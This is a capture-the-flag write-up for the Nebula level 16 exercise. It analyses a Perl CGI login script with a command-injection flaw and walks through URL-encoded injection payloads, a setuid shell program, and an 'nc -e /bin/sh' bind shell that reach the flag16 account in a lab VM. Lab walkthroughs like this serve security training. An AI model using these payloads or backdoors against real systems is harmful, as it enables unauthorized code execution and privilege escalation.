Question URL: https://exploit.education/nebula/level-16/

Source Code:
#!/usr/bin/env perl

# qw()('quote word') extracts words out of your string using embedded
# whitespace as the delimiter and returns the words as a list.
# This happens at compile time.
# any non-alphanumeric, non-whitespace can replace () such as {}, <>,[]
# "use CGI" vs. "Use CGI qw(:standard)"
# - "use CGI" is for OOP where you need to create a instance like
#    use CGI;
#    my $q = new CGI;
#    $q->redirect('http://www.example.com');
# - "use CGI qw(:standard) is for Function Oriented programming like
#    use CGI qw(:standard);  <= Importing standard functions
#    redirect('http://www.example.com');

# "use CGI qw{param}; => CGI param() function is imported. Call it with the
# name of a form item, and a list of all the values of that form item will be
# returned. param("username") => username form value is returned.
use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
        $username = $_[0];
        $password = $_[1];

        # "=~" is called Perl binding operator.
        # "=~" operator binds a string expression(left) to a pattern match(m//),
        # substitution (s///), transliteration (tr///) on the right.
        $username =~ tr/a-z/A-Z/;       # conver to uppercase
        $username =~ s/\s.*//;          # strip everything after a space

        @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
        foreach $line (@output) {
                ($usr, $pw) = split(/:/, $line);


                if($pw =~ $password) {
                        return 1;
                }
        }

        return 0;
}

# Return value of sub login{} becomes $_[0]
sub htmlz {
        print("<html><head><title>Login resuls</title></head><body>");
        if($_[0] == 1) {
                print("Your login was accepted<br/>");
        } else {
                print("Your login failed<br/>");
        }
        print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));


Code Analysis
a. use CGI qw{param}
- This perl program uses Function Oriented Programming and import param function which can be used like param("username") to get
  the value of username parameter of URI
b. param("username") and param("password") 
- It returns a parameter value which is being sent with the form of index.cgi?username=your_username&password=your_pw
c. login(param("username"), param("password"))
- With the retrieved username, all lowercase characters are changed into uppercase ($username=~tr/a-z/A-Z/;)
- Then any trailing string after a space will be removed.
d.  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
- Line including all filters applied username is serarched from /home/flag16/userdb.txt and the line is returned.
- From the returned line, password filed is extracted and if the extracted password is same to provieded password, return 1. Otherwise 0

Vulnerability and exploit plan
- The line of `egrep "^$username" /home/flag16/userdb.txt 2>&1` can excute anything provided by properly manipulating $username portion
- As we are passing the parameters thorugh URL, we need proper URL encoding.
- To avoid uppercase challenge, use /*/ and uppercase file name
  : e.g. To specify /tmp/GETSH => /*/GETSH

Sol A - Simply get flag
1. /tmp/shell.c + Shell script file(/tmp/GETSH) compiling and setting setuid
// /tmp/shell.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int main(){
    uid_t uid = geteuid();
    setresuid(uid, uid, uid);
    system("/bin/sh");
    return 0;

}

// /tmp/GETSH
#!/bin/sh
gcc -o /home/flag16/shell /tmp/shell.c
chmod +s /home/flag16/shell

// Add execute permission to GETSH
$chmod 755 /tmp/GETSH

2. URI parameter setup
 - Use bash trick /*/ to avoid uppser case challenge
  : /*/GETSH
 - URL enconding (`-> %60, /->%2F, *->%2A)
  : index.cgi?username=`/*/GETSH`&password= ==> index.cgi?username=%60%2F%2A%2FGETSH%60&password=

3. Execute: http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password=
Your login failed
Would you like a cookie?

level16@nebula:/home/flag16$ ls -al /home/flag16/shell
-rwsr-sr-x 1 flag16 flag16 7240 2019-02-21 05:56 /home/flag16/shell

level16@nebula:/home/flag16$ ./shell
sh-4.2$ id
uid=983(flag16) gid=1017(level16) egid=983(flag16) groups=983(flag16),1017(level16)
sh-4.2$ getflag
You have successfully executed getflag on a target account

A little bit different way to simply get flag.
// /tmp/GETSH
#!/bin/sh
gcc -o /home/flag16/shell /tmp/shell.c
/bin/getflag > /tmp/showflag
chmod +s /home/flag16/shell

Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password= with browser.

level16@nebula:/tmp$ more /tmp/showflag
You have successfully executed getflag on a target account



Sol B - To get flag16 shell by using Revershell
-This solution is very similar with Sol A. The only differece is that this solution implants Reverse Shell(backdoor) inside of GETSH
script.

// /tmp/GETSH
#!/bin/sh

nc.traditional -lvnp 4444 -e /bin/sh
# -l: Listen mode
# -v: Verbose output
# -n: No DNS lookup
# -p port: Local port number
# -e filename: Excute filename after connection is established
# -c string: Specify shell command to exec afer connect

Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password= with browser.

level16@nebula:~$ netstat -an | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN

level16@nebula:/tmp$ nc localhost 4444
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account
** Once the connection is established, nc closes the listening port 444. However, connected session can continuously use the execed
reverse shell with the privilege of flag16 **


Sol C - Use Bash tricks to mitigate uppercase issue (https://wiki.bash-hackers.org/syntax/pe#case_modification)

- Use /tmp/getsh like below.

// /tmp/getsh
#!/bin/sh
/bin/getflag > /tmp/showflag

- Use encoded string like below
"</dev/null;pwnvar=/tmp/getsh;${pwnvar,,};#  ==> %22%3C%2Fdev%2Fnull%3Bpwnvar%3D%2Ftmp%2Fgetsh%3B%24%7Bpwnvar%2C%2C%7D%3B%23
  ""</dev/null" - Provide null input(") and /dev/null search file to egrep
  "pwnvar=/tmp/getsh" - Store /tmp/getsh to a pwnvar variable
  "${pwnvar,,}" - Bash case modification operation, ",,", will change /TMP/GETSH to /tmp/getsh


Then run http://192.168.10.134:1616/index.cgi?username=%22%3C%2Fdev%2Fnull%3Bpwnvar%3D%2Ftmp%2Fgetsh%3B%24%7Bpwnvar%2C%2C%7D%3B%23&password= 
with browser.

level16@nebula:/tmp$ more showflag
You have successfully executed getflag on a target account


